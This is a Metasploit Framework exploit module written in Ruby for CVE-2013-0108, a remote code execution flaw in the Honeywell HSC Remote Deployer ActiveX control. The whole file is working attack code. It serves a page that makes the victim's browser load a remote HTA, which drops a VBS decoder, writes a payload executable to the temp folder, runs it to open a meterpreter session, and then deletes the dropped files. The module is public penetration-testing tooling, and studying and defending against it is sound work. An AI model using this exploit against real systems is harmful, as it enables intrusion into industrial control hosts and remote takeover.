##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Honeywell HSC Remote Deployer ActiveX Remote Code Execution",
      'Description'    => %q{
          This modules exploits a vulnerability found in the Honewell HSC Remote Deployer
        ActiveX. This control can be abused by using the LaunchInstaller() function to
        execute an arbitrary HTA from a remote location. This module has been tested
        successfully with the HSC Remote Deployer ActiveX installed with HoneyWell EBI
        R410.1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'juan vazquez'
        ],
      'References'     =>
        [
          [ 'CVE', '2013-0108' ],
          [ 'OSVDB', '90583' ],
          [ 'BID', '58134' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/03/11/cve-2013-0108-honeywell-ebi' ],
          [ 'URL', 'http://ics-cert.us-cert.gov/pdf/ICSA-13-053-02.pdf' ]
        ],
      'Payload'        =>
        {
          'Space'    => 2048,
          'StackAdjustment' => -3500
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f -k'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 22 2013",
      'DefaultTarget'  => 0))
  end

  def exploit
    @var_exename = rand_text_alpha(5 + rand(5)) + ".exe"
    @dropped_files = [
      @var_exename
    ]
    super
  end

  def on_new_session(session)
    if session.type == "meterpreter"
      session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
    end

    @dropped_files.delete_if do |file|
      win_file = file.gsub("/", "\\\\")
      if session.type == "meterpreter"
        begin
          wintemp = session.fs.file.expand_path("%TEMP%")
          win_file = "#{wintemp}\\#{win_file}"
          session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
          session.fs.file.rm(win_file)
          print_good("Deleted #{file}")
          true
        rescue ::Rex::Post::Meterpreter::RequestError
          print_error("Failed to delete #{win_file}")
          false
        end

      end
    end
  end

  def build_hta(cli)
    var_shellobj    = rand_text_alpha(rand(5)+5);
    var_fsobj    = rand_text_alpha(rand(5)+5);
    var_fsobj_file    = rand_text_alpha(rand(5)+5);
    var_vbsname    = rand_text_alpha(rand(5)+5);
    var_writedir    = rand_text_alpha(rand(5)+5);

    var_origLoc    = rand_text_alpha(rand(5)+5);
    var_byteArray    = rand_text_alpha(rand(5)+5);
    var_writestream    = rand_text_alpha(rand(5)+5);
    var_strmConv    = rand_text_alpha(rand(5)+5);

    p = regenerate_payload(cli);
    exe = generate_payload_exe({ :code => p.encoded })

    # Doing in this way to bypass the ADODB.Stream restrictions on JS,
    # even when executing it as an "HTA" application
    # The encoding code has been stolen from ie_unsafe_scripting.rb
    print_status("Encoding payload into vbs/javascript/hta...");

    # Build the content that will end up in the .vbs file
    vbs_content  = Rex::Text.to_hex(%Q|
Dim #{var_origLoc}, s, #{var_byteArray}
#{var_origLoc} = SetLocale(1033)
|)
    # Drop the exe payload into an ansi string (ansi ensured via SetLocale above)
    # for conversion with ADODB.Stream
    vbs_ary = []
    # The output of this loop needs to be as small as possible since it
    # gets repeated for every byte of the executable, ballooning it by a
    # factor of about 80k (the current size of the exe template).  In its
    # current form, it's down to about 4MB on the wire
    exe.each_byte do |b|
      vbs_ary << Rex::Text.to_hex("s=s&Chr(#{("%d" % b)})\n")
    end
    vbs_content << vbs_ary.join("")

    # Continue with the rest of the vbs file;
    # Use ADODB.Stream to convert from an ansi string to it's byteArray equivalent
    # Then use ADODB.Stream again to write the binary to file.
    #print_status("Finishing vbs...");
    vbs_content << Rex::Text.to_hex(%Q|
Dim #{var_strmConv}, #{var_writedir}, #{var_writestream}
                    #{var_writedir} = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\\#{@var_exename}"

Set #{var_strmConv} = CreateObject("ADODB.Stream")

#{var_strmConv}.Type = 2
#{var_strmConv}.Charset = "x-ansi"
#{var_strmConv}.Open
#{var_strmConv}.WriteText s, 0
#{var_strmConv}.Position = 0
#{var_strmConv}.Type = 1
#{var_strmConv}.SaveToFile #{var_writedir}, 2

SetLocale(#{var_origLoc})|)

    hta = <<-EOS
      <script>
      var #{var_shellobj} = new ActiveXObject("WScript.Shell");
      var #{var_fsobj}    = new ActiveXObject("Scripting.FileSystemObject");
      var #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings("%TEMP%");
      var #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs",2,true);

      #{var_fsobj_file}.Write(unescape("#{vbs_content}"));
      #{var_fsobj_file}.Close();

      #{var_shellobj}.run("wscript.exe " + #{var_writedir} + "\\\\" + "#{var_vbsname}.vbs", 1, true);
      #{var_shellobj}.run(#{var_writedir} + "\\\\" + "#{@var_exename}", 0, false);
      #{var_fsobj}.DeleteFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs");
      window.close();
      </script>
    EOS

    return hta
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']

    if agent !~ /MSIE \d/
      print_error("Browser not supported: #{agent.to_s}")
      send_not_found(cli)
      return
    end

    uri  = ((datastore['SSL']) ? "https://" : "http://")
    uri << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST'])
    uri << ":#{datastore['SRVPORT']}"

    print_status("Request received for #{request.uri}");

    if request.uri =~ /\/SystemDisplays\/RemoteInstallWelcome.hta/
      hta = build_hta(cli)
      print_status("Sending HTA application")
      send_response(cli, hta, {'Content-Type'=>'application/hta'})
      return
    end

    html = <<-EOS
    <html>
    <body>
    <object id="RemoteInstaller" classid="clsid:0D080D7D-28D2-4F86-BFA1-D582E5CE4867">
    </object>
    <script>
      RemoteInstaller.LaunchInstaller("#{uri}", "", false);
    </script>
    </body>
    </html>
    EOS

    # we need to handle direct /SystemDisplays/RemoteInstallWelcome.hta requests
    proc = Proc.new do |cli, req|
      on_request_uri(cli, req)
    end

    add_resource({'Path' => "/SystemDisplays/RemoteInstallWelcome.hta", 'Proc' => proc}) rescue nil

    print_status("Sending html")
    send_response(cli, html, {'Content-Type'=>'text/html'})

  end

end
